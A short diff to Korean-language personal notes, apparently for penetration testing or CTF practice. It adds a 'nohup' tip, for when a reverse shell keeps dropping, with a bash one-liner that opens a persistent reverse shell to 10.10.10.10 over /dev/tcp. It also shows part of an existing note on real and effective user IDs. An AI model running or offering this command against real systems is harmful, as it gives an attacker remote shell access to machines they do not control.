@@ -1,4 +1,15 @@
 <details>
+	<summary><strong>nohup</strong></summary>
+
+- 리버스 셸이 지속적으로 끊길 때 사용해보기.
+```bash
+bash -c 'nohup bash -i >&/dev/tcp/10.10.10.10/80 0>&1'
+```
+	
+</details>
+
+---
+<details>
   <summary><strong>ruid euid</strong></summary>
 
 - `ruid` : `Real User ID` / 프로세스를 실행한 유저.
